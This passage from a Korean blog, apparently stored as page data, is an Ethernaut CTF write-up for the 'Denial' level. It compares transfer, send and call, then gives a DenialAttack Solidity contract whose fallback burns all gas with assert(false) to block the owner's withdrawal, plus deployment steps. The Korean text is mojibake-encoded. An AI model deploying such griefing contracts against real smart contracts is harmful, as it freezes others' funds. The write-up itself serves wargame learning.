<span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint</span> amountToSend <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// perform a call without checking return</span>\n        <span class=\"token comment\">// The recipient can revert, the owner will still get their share</span>\n        <span class=\"token comment\">// ì‘ì„±ìì˜ ì˜ë„ëŠ” callì„ ì‚¬ìš©í•¨ìœ¼ë¡œì¨ partnerê°€ ê³ ì˜ì ìœ¼ë¡œ revertí•´ë„ ownerê°€ 1%ì„ ë°›ê²Œí•˜ê¸° ìœ„í•¨ì´ë‹¤.</span>\n        partner<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span>amountToSend<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        owner<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>amountToSend<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// keep track of last withdrawal time</span>\n        <span class=\"token comment\">// ë§ˆì§€ë§‰ìœ¼ë¡œ withdrawí•œ ì‹œê°„</span>\n        timeLastWithdrawn <span class=\"token operator\">=</span> now<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// íŒŒíŠ¸ë„ˆê°€ withdrawí•œ amount</span>\n        withdrawPartnerBalances<span class=\"token punctuation\">[</span>partner<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> withdrawPartnerBalances<span class=\"token punctuation\">[</span>partner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>amountToSend<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// allow deposit of funds</span>\n    <span class=\"token comment\">// ëª¨ë“  ì…ê¸ˆì„ í—ˆìš©í•œë‹¤.</span>\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// convenience function</span>\n    <span class=\"token comment\">// contractê°€ ê°€ì§€ê³  ìˆëŠ” etherì˜ ìˆ˜ë¥¼ í™•ì¸í•˜ëŠ” í•¨ìˆ˜</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">contractBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"í’€ì´\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"í’€ì´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>í’€ì´</h2>\n<h3 id=\"ë“¤ì–´ê°€ê¸°-ì „\" style=\"position:relative;\"><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0-%EC%A0%84\" aria-label=\"ë“¤ì–´ê°€ê¸° ì „ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë“¤ì–´ê°€ê¸° ì „</h3>\n<p>ì´ ë¬¸ì œëŠ” callê³¼ transferì˜ ì°¨ì´ë¥¼ ì˜ ì•Œì•„ì•¼ í’€ ìˆ˜ ìˆëŠ” ë¬¸ì œì´ë‹¤.</p>\n<h4 id=\"transfer\" style=\"position:relative;\"><a href=\"#transfer\" aria-label=\"transfer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>transfer</h4>\n<ul>\n<li>ìˆ˜ì‹  ìŠ¤ë§ˆíŠ¸ ê³„ì•½ì—ëŠ” fallback í•¨ìˆ˜ê°€ ì •ì˜ë˜ì–´ ìˆì–´ì•¼ í•œë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ì „ì†¡ í˜¸ì¶œì— ì˜¤ë¥˜ê°€ ë°œìƒí•œë‹¤. <code class=\"language-text\">transfer</code>ì€ ê°€ìŠ¤ ì œí•œëŸ‰ì€ 2300ìœ¼ë¡œ <code class=\"language-text\">transfer</code>ì„ ì™„ë£Œí•˜ê¸°ì— í•œ ì–‘ì´ë‹¤.</li>\n</ul>\n<h4 id=\"send\" style=\"position:relative;\"><a href=\"#send\" aria-label=\"send permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>send</h4>\n<ul>\n<li><code class=\"language-text\">transfer</code>ê³¼ ìœ ì‚¬í•œ ë°©ì‹ìœ¼ë¡œ ì‘ë™í•˜ë©° ê°€ìŠ¤ ì œí•œë„ 2300ì´ë‹¤. í•˜ì§€ë§Œ <code class=\"language-text\">transfer</code>ê³¼ ë‹¤ë¥´ê²Œ statusë¥¼ <code class=\"language-text\">bool</code> ê°’ìœ¼ë¡œ ë°˜í™˜í•œë‹¤.</li>\n</ul>\n<h4 id=\"call\" style=\"position:relative;\"><a href=\"#call\" aria-label=\"call permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>call</h4>\n<ul>\n<li>\n<p>smart contractì— ETHë¥¼ ë³´ë‚´ëŠ” ê¶Œì¥ë˜ëŠ” ë°©ë²•ì´ë‹¤. callì˜ ë¹ˆ ì¸ìˆ˜ëŠ” ìˆ˜ì‹  ì£¼ì†Œì˜ fallback í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¨ë‹¤.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span><span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> _to<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p><code class=\"language-text\">call</code>ì„ ì‚¬ìš©í•˜ì—¬ contractì— ì •ì˜ëœ ë‹¤ë¥¸ ê¸°ëŠ¥ì„ ì‹¤í–‰ì‹œí‚¤ê³  í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ê³ ì •ëœ ì–‘ì˜ ê°€ìŠ¤ë¥¼ ë³´ë‚¼ ìˆ˜ë„ ìˆë‹¤. íŠ¸ëœì­ì…˜ì˜ ìƒíƒœê°€ <code class=\"language-text\">bool</code>ê°’ìœ¼ë¡œ ì „ì†¡ë˜ê³  return ê°’ì´ ë°ì´í„° ë³€ìˆ˜ë¡œ ì „ì†¡ëœë‹¤. ê³ ì •ëœ ì–‘ì˜ gasë¥¼ ë³´ë‚´ì§€ ì•ŠëŠ”ë‹¤ë©´ ì‚¬ìš©ê°€ëŠ¥í•œ ëª¨ë“  gasë¥¼ ë³´ë‚¸ë‹¤.</p>\n</li>\n</ul>\n<br/>\n<p>ìš°ë¦¬ëŠ” callì„ ì‚¬ìš©í•´ ê°€ì ¸ì˜¤ëŠ” gas ëª¨ë‘ ì†Œëª¨í•´ ë¬¸ì œë¥¼ í•´ê²°í•  ìˆ˜ ìˆë‹¤.</p>\n<h3 id=\"í’€ì´-1\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4-1\" aria-label=\"í’€ì´ 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>í’€ì´</h3>\n<p>ê·¸ë ‡ë‹¤ë©´ ì–´ë–»ê²Œ ëª¨ë“  gasë¥¼ ì†Œëª¨í•  ìˆ˜ ìˆì„ê¹Œ?\ngasë¥¼ ëª¨ë‘ ì†Œëª¨í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ëª‡ê°€ì§€ ìˆë‹¤.</p>\n<ol>\n<li>while(true){}</li>\n<li>assert</li>\n</ol>\n<ul>\n<li>\n<p><code class=\"language-text\">assert</code>ëŠ” <code class=\"language-text\">revert</code>ì™€ <code class=\"language-text\">require</code>ê³¼ ë‹¤ë¥´ê²Œ ëª¨ë“  gasë¥¼ ì†Œëª¨ì‹œí‚¨ë‹¤. ì¦‰ assertê°€ ì•„ë‹Œ ë‹¤ë¥¸ ê²ƒì„ ì‚¬ìš©í•˜ì—¬ <code class=\"language-text\">revert</code>í•˜ë©´ gasë¥¼ ì „ë¶€ ì†Œëª¨ì‹œí‚¬ ìˆ˜ ì—…ì—†ë‹¤.</p>\n</li>\n<li>\n<p>í•„ìëŠ” reentrencyë¥¼ ì‚¬ìš©í•˜ì—¬ í’€ë ¤í•˜ì˜€ì§€ë§Œ reentrencyë¥¼ ì‚¬ìš©í•˜ì˜€ì„ë•Œ Denial contractì— ì˜ˆê¸°ì¹˜ ëª»í•œ ERRORë¥¼ ë§Œë“¤ ìˆ˜ëŠ” ìˆì§€ë§Œ ownerì—ê²Œ ETHê°€ ì „ì†¡ë˜ì–´ ì‹¤íŒ¨í•˜ì˜€ë‹¤. ê·¸ë˜ì„œ ê°€ìŠ¤ë¥¼ ë‹¤ ì†Œëª¨í•  ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ ë°©ë²•ì„ ì‚¬ìš©í•˜ì˜€ë‹¤.</p>\n</li>\n</ul>\n<p>í•„ìëŠ” 2ë²ˆì„ ì‚¬ìš©í•˜ì—¬ ë¬¸ì œë¥¼ í’€ì—ˆë‹¤.</p>\n<p>ìš°ì„  Denial Attack Contractì— fallbackì„ ë§Œë“¤ì–´ë³´ì</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">DenialAttack</span> <span class=\"token punctuation\">{</span>\n\n    Denial denial<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// ê³µê²©í•  contractë¥¼ Denial contractë¡œ ì„¤ì •</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _denial<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        denial <span class=\"token operator\">=</span> <span class=\"token function\">Denial</span><span class=\"token punctuation\">(</span>_denial<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// attackì„ ì§„í–‰í•˜ëŠ” í•¨ìˆ˜</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// DenialAttack contractë¥¼ íŒŒíŠ¸ë„ˆë¡œ ë§Œë“¤ê³  withdrawì‹¤í–‰</span>\n        denial<span class=\"token punctuation\">.</span><span class=\"token function\">setWithdrawPartner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        denial<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// withdrawì´í›„ ETHê°€ ì „ì†¡ë  ë•Œ fallbackì„ ì‹¤í–‰ì‹œí‚¤ë©° ëª¨ë“  gasì†Œëª¨</span>\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//ë°©ë²• 1. while(true){}</span>\n        <span class=\"token comment\">//ë°©ë²• 2. assert(false);</span>\n        <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span> </code></pre></div>\n<br/>\nì´ ì½”ë“œë¥¼ remixë¥¼ í†µí•´ Rinkeby networkì— deployí•œ í›„ attack()ì„ ì‹¤í–‰ì‹œì¼œì£¼ë©´ ëë‚œë‹¤.\n<p>attack()ì„ ì‹¤í–‰ì‹œí‚¨ í›„ transactionì´ ì™„ë£Œë˜ë©´ etherscanì—ì„œ gas limitì„ ì´ˆê³¼í•´ ì—ëŸ¬ê°€ ë‚¬ë‹¤ê³  ë‹¤ìŒê³¼ ê°™ì´ ë‚˜ì˜¬ ê²ƒì´ë‹¤.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 91.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAABJ0AAASdAHeZh94AAAB7UlEQVQ4y51Ui46bMBDk/z+wUqXk0gvBNm/w+8lUmEuOJo0S3UojL/YyjD1eimZUKDuFUVg4pTAPA8Q0wWoDby3mcYK3DkYpSKmwxrIsT1HEeUJsGHxN4ctPpKZGIBU8JXDlGbFmOU9CvCTLhLloh4SfxY1QSonj4YDj8YjT6YSP0wnGGIQQELz/xvp8hffw+7kYM9kaBeczmrpB27To6xoNoagJBSEENWOghIBUBIwyMEpzXl0qXMoShFA0rEbb9ogxboTWOpRlCa0UzkHjw0pMKfx424VzLisxWmOKHn2w0Ck+nM07yApnIfHr9wETl1hiRHAe3nkY62CdvxXuX7on+YfQhgUybO4qpdGPM8aZYxhnTLNA+ircK96P91GsWy3Pn9npYRgeClJKGSvBOr682EpKMFajqqrsbNs06Ps+j13bouu2fOh7cM5fK9wvrApW+6+q7vGOMYVUGh+nPxC3PgXSirTk84tpj9ekBTcB1aBBRgM6O7TCoxMeDd9AJgc2uzyXb8Kdww9b1tqAfzV+lrdcu3rf5U9v8nflVeHANcrygm6Y0IiAToasrM5Y85DzVmzzlEcMXEBJvn0b97+vGOBEDStaOD3BqR5Oj7BqgOEUZjrnNat6WLmOIyxn8Hr8r9vF48GmN/DclL9U4n9H0E/t5QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"gas\"\n        title=\"gas\"\n        src=\"/static/638f09c4cc88ae0e5591c252bf844701/37523/gas_denial.png\"\n        srcset=\"/static/638f09c4cc88ae0e5591c252bf844701/e9ff0/gas_denial.png 180w,\n/static/638f09c4cc88ae0e5591c252bf844701/f21e7/gas_denial.png 360w,\n/static/638f09c4cc88ae0e5591c252bf844701/37523/gas_denial.png 720w,\n/static/638f09c4cc88ae0e5591c252bf844701/d125e/gas_denial.png 737w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<br/>\n<p>ì—ëŸ¬ë¥¼ í™•ì¸í–ˆë‹¤ë©´ ethernautìœ¼ë¡œ ëŒì•„ì™€ Submit instanceë¥¼ ëˆ„ë¥´ê³  ì¡°ê¸ˆ ê¸°ë‹¤ë¦¬ë©´ blockì´ mineë˜ê³ , ì•„ë˜ì™€ ê°™ì´ ëœ¨ë©° ë§ˆë¬´ë¦¬ëœë‹¤.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Ù©(- Ì®Ì®Ìƒ-Ìƒ)Û¶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"ë§ˆë¬´ë¦¬\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"ë§ˆë¬´ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆë¬´ë¦¬</h2>\n<p>ì—­ì‹œ ethernautë¥¼ í’€ë©´ì„œ solidityì— ëŒ€í•´ ë‹¤ì‹œ ë³µìŠµí•˜ê³  ìˆëŠ”ê²ƒ ê°™ë‹¤. <code class=\"language-text\">send vs transfer vs call</code>ì— ëŒ€í•´ì„œë„ ë‹¤ì‹œ ì°¾ì•„ë³´ë©° ê³µë¶€í•  ìˆ˜ ìˆì—ˆê³ , assert, revertì™€ requireì˜ ì°¨ì´ì ì„ ê³µë¶€í•  ìˆ˜ ìˆì—ˆë˜ ë¬¸ì œì˜€ë˜ ê²ƒ ê°™ë‹¤.</p>\n<hr>\n<h2 id=\"ref\" style=\"position:relative;\"><a href=\"#ref\" aria-label=\"ref permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>REF</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">ìŠ¹ë¦¬ ì¡°ê±´</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">ì½”ë“œ ë¶„ì„</a></p>\n</li>\n<li>\n<p><a href=\"#%ED%92%80%EC%9D%B4\">í’€ì´</a></p>\n<ul>\n<li>\n<p><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0-%EC%A0%84\">ë“¤ì–´ê°€ê¸° ì „</a></p>\n<ul>\n<li><a href=\"#transfer\">transfer</a></li>\n<li><a href=\"#send\">send</a></li>\n<li><a href=\"#call\">call</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%ED%92%80%EC%9D%B4-1\">í’€ì´</a></p>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">ë§ˆë¬´ë¦¬</a></p>\n</li>\n<li>\n<p><a href=\"#ref\">REF</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"February 07, 2022","title":"(Ethernaut ì·¨ì•½ì  20) Denial","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/CTFs/20_denial_ethernaut/20_denial_ethernaut/"}},"prev":{"id":"a479faa9-d516-5ecb-aeaa-397ad465fb6f","html":"<h1 id=\"-1-dex\" style=\"position:relative;\"><a href=\"#-1-dex\" aria-label=\" 1 dex permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ 1. Dex</h1>\n<p><strong>Difficulty 3/10</strong></p>\n<ul>\n<li>ìŠ¹ë¦¬ ì¡°ê±´</li>\n<li>ì½”ë“œ ë¶„ì„</li>\n<li>í’€ì´</li>\n</ul>\n<p>ìˆœì„œë¡œ ì§„í–‰ ë  ê²ƒì´ë‹¤.</p>\n<hr>\n<h2 id=\"ìŠ¹ë¦¬-ì¡°ê±´\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"ìŠ¹ë¦¬ ì¡°ê±´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ìŠ¹ë¦¬ ì¡°ê±´</h2>\n<ul>\n<li>Dex Contract í•´í‚¹ í›„ í† í° ì¤‘ í•˜ë‚˜ë¥¼ ëª¨ë‘ ì†Œì§„(0ìœ¼ë¡œ ë§Œë“¤ê¸°)í•˜ëŠ” ê²ƒì´ë‹¤.</li>\n</ul>\n<hr>\n<h2 id=\"ë“¤ì–´ê°€ê¸°-ì „\" style=\"position:relative;\"><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0-%EC%A0%84\" aria-label=\"ë“¤ì–´ê°€ê¸° ì „ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë“¤ì–´ê°€ê¸° ì „</h2>\n<p>ì´ë²ˆ ë¬¸ì œëŠ” DEXì™€ ERC20ì— ëŒ€í•œ ì§€ì‹ì´ ì—†ë‹¤ë©´ í’€ìˆ˜ ì—†ëŠ” ë¬¸ì œì´ë‹¤.\nUniswapì˜ ì½”ë“œë¥¼ ì „ë¶€ ë¶„ì„í•˜ì§€ëŠ” ëª»í•˜ë”ë¼ë„ ì‘ë™ì›ë¦¬ì— 